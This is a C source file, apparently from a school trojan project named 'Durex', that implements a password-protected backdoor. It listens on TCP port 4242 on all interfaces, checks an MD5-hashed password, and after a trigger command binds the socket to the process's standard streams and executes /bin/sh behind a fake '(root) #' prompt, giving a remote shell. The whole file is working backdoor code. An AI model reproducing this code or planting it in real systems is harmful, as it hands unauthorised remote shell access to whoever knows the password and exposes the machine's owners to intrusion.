#include <durex.h>

void	handle_sigchld(int p)
{
	(void)p;
	wait4(-1, NULL, WNOHANG, NULL);
	g_nbr_connections--;
}

void	connection(int sock, char **env)
{
	char	*str;
	char	*hash;

	while (1)
	{
		write(sock, "Password : ", 11);
		if ((get_next_line(sock, &str)) <= 0)
			exit(0);
		hash = md5(str);
		free(str);
		if (ft_strcmp(hash, PASSWORD) == 0)
		{
			free(hash);
			break;
		}
		free(hash);
	}
	write(sock, "Success !\n", 10);
	while (1)
	{
		write(sock, "(root) # ", 9);
		if ((get_next_line(sock, &str)) <= 0)
			exit(0);
		if (ft_strcmp(str, SHELL) == 0)
		{
			write(sock, "shell run\n", 10);
			break ;
		}
		free(str);
	}
	dup2(sock, 2);
	dup2(sock, 1);
	dup2(sock, 0);
	execve("/bin/sh", (char *[]){"/bin/sh", NULL}, env);
}

void	handle_connection(int sock, char **env)
{
	int					cs;
	struct sockaddr_in	csin;
	socklen_t			addrlen;

	signal(SIGCHLD, handle_sigchld);
	while (42)
	{
		addrlen = sizeof(struct sockaddr_in);
		if ((cs = accept(sock, (struct sockaddr*)&csin, &addrlen)) == -1)
			exit(2);
		else if (g_nbr_connections > 2)
			close(cs);
		else if (fork() == 0)
		{
			connection(cs, env);
			exit(1);
		}
		else
		{
			g_nbr_connections++;
			close(cs);
		}
	}
}

int		create_server()
{
	int				sock;
	struct protoent	*proto;
	struct sockaddr_in	sin;

	if (!(proto = getprotobyname("tcp")))
		return (0);
	sock = socket(AF_INET, SOCK_STREAM, proto->p_proto);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4242);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		return (0);
	if (listen(sock, 3) == -1)
		return (0);
	return (sock);
}
